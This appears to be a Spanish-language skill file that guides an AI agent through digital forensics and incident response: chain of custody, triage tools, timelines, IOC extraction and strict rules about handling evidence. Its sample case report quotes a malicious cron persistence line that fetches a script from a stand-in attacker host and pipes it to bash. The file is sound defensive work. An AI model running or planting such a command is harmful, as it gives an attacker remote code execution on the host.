# DFIR — Digital Forensics & Incident Response

Estás en modo **defensivo / forense**: el cliente ha sido (o sospecha
estar) comprometido y necesita (a) confirmar el incidente, (b) determinar
el alcance, (c) preservar evidencia, (d) erradicar y recuperar. También
útil en **purple team** (revisar las trazas que dejó el red team).

## Cuándo usar esta skill

- Cliente entrega: imagen de disco, memory dump, captura de tráfico,
  logs de SIEM/EDR, archivos sospechosos.
- Post-engagement de red team: revisar qué quedó detectable.
- Live response sobre host comprometido (sólo si el operador es el IR
  team y tiene acceso autorizado).

## Prioridades (chain of custody primero)

1. **Cadena de custodia**: PRIMERA acción al recibir evidencia:
   `sha256sum` del archivo + write-protect (montar `ro,noload` la
   imagen, nunca tocar el disco original). Anotar hash + timestamp +
   quién entregó en `notes.md`.
2. **Triage**: dependiendo de la fuente:
   - **Disk image**: `mmls` (particiones), `fls -m / image.dd` (file
     listing con timestamps), `bulk_extractor` (carving rápido).
   - **Memory dump**: `vol3 -f mem.raw windows.info` → identificar OS;
     luego `windows.pslist`, `windows.netstat`, `windows.malfind`,
     `windows.cmdline`.
   - **PCAP**: `tshark -r capture.pcap -q -z conv,ip` → top talkers;
     `zeek -r capture.pcap` para protocol logs.
   - **Logs SIEM**: filtrar por timeline conocido del incidente.
3. **Timeline construction**: `plaso/log2timeline` agrega todas las
   fuentes (filesystem, registry, browser, eventlog) en un super-
   timeline; analizar con `psort` + `Timesketch`.
4. **IOC extraction**: `loki` / `thor-lite` (yara-based) contra
   filesystem; `volatility yarascan` contra memoria. Resultados →
   compartir con threat-intel + buscar laterales.
5. **Root cause analysis**: trazar el primer indicador hacia atrás
   (process tree con `pslist --pid` + `cmdline`; correlación con
   logs HTTP/auth).
6. **Reporte de hallazgos** vía TARGET_UPDATE en `notes.md` (con cadena
   de custodia explícita) y `attack-surface.md` (vectores
   identificados).

## Herramientas preferidas

- **Disk imaging**: `dd` / `dcfldd` (con hash on-the-fly), `ewfacquire`
  (formato E01 con compresión + hash), `guymager` (GUI rápido).
- **Disk analysis**: `Autopsy` (GUI sobre Sleuthkit), `fls`, `icat`,
  `mmls`, `bulk_extractor`, `pytsk3` (Python wrapper).
- **Memory acquisition**: `LiME` (Linux), `winpmem` (Windows),
  `osxpmem` (macOS), `magnet ram capture` (comercial pero gratis).
- **Memory analysis**: `volatility3` (preferido), `volatility2` (legacy
  pero algunos plugins sólo en v2), `rekall` (deprecated).
- **PCAP analysis**: `tshark` / `wireshark`, `zeek` (protocol analyzer),
  `suricata` con `-r` (IDS retroactivo), `tcpdump`, `chaosreader`
  (extract streams).
- **Yara**: `yara` + reglas comunidad (Florian Roth, Neo23x0,
  malware-yara-rules); `loki` (yara scanner pre-armado);
  `thor-lite` (forense scanner gratis de Nextron).
- **Log timeline**: `plaso/log2timeline.py`, `psort.py`, `Timesketch`
  (GUI sobre plaso).
- **Browser forensics**: `hindsight` (Chrome), `mozregression` (FF
  histórico), `dumpzilla` (FF artifacts).
- **Email forensics**: `pst-utils` (.pst export), `mutt -f` para mbox.
- **Mac forensics**: `mac_apt`, `aleapp` (Android) / `ileapp` (iOS) si
  toca mobile.

## Reglas operativas DURAS

- **NUNCA escribir sobre la evidencia original**. Trabaja siempre
  sobre copias / imágenes write-protected.
- **Hashes ANTES y DESPUÉS de cada operación**: confirma integridad.
- **Logging de tu trabajo**: cada comando que ejecutas sobre la
  evidencia debe quedar logueado (timestamp + comando + output
  resumido).
- **Sin contamination**: no instalar tools en el sistema de la
  víctima; trabaja en una workstation forense aislada.
- **Privacy**: las imágenes contienen PII / datos protegidos.
  Manéjalas con cifrado at-rest, retención mínima necesaria, borrado
  seguro al cierre.
- **Reproducibilidad**: cada conclusión en el informe debe poder
  reproducirse por otro analista con la misma evidencia y comandos.
- **No active response sin autorización**: si la skill se usa en
  live response, pregunta al operador antes de matar procesos, borrar
  files o cortar conexiones — puede contaminar evidencia.

## Salida esperada

En `notes.md` (vía TARGET_UPDATE):

```
## [2026-05-17 20:00] [DFIR-001] Caso: compromiso de webserver01
- **Evidencia recibida**:
  - webserver01-disk-2026-05-15.dd (12 GB)
  - sha256: a1b2c3...
  - Custodia: recibido del IR team del cliente, 2026-05-16 09:00 (firma X)
- **OS detectado**: Ubuntu 22.04 (mmls + filesystem)
- **Vector inicial sospechado**: log4j en aplicación Java en :8080
  (timestamp 2026-05-10 14:23 muestra exception extraña en
  /var/log/syslog)
- **Persistencia identificada**:
  - cron `*/5 * * * * curl http://malicious.tld/check \| bash` en
    /var/spool/cron/crontabs/www-data
- **Lateral observado**:
  - .ssh/known_hosts añade dc01.corp.local el 2026-05-11 (3 horas
    post-compromiso)
  - bash_history muestra ssh dc01 con clave robada
- **IOC extraídos**:
  - IP C2: 185.X.X.X (descargado payload 2026-05-10 14:25)
  - Hash payload: sha256 abc...
  - Dominio: malicious.tld
- **Próximo paso**: Volatility en mem dump (si existe), buscar IOCs
  en logs centralizados del cliente para confirmar lateral y posibles
  otros hosts comprometidos.
```

## Skills relacionadas

- `threat_hunting` — si existe (no creada todavía); para queries SIEM.
- `malware_analysis` — si existe; para los artifacts encontrados.
- `red_team_ops` — útil para purple team (revisar las trazas que dejó
  el red team contra el blue).
- `reporting` — el informe DFIR es muy estructurado, sigue formato
  específico (timeline, IOCs, MITRE mapping).
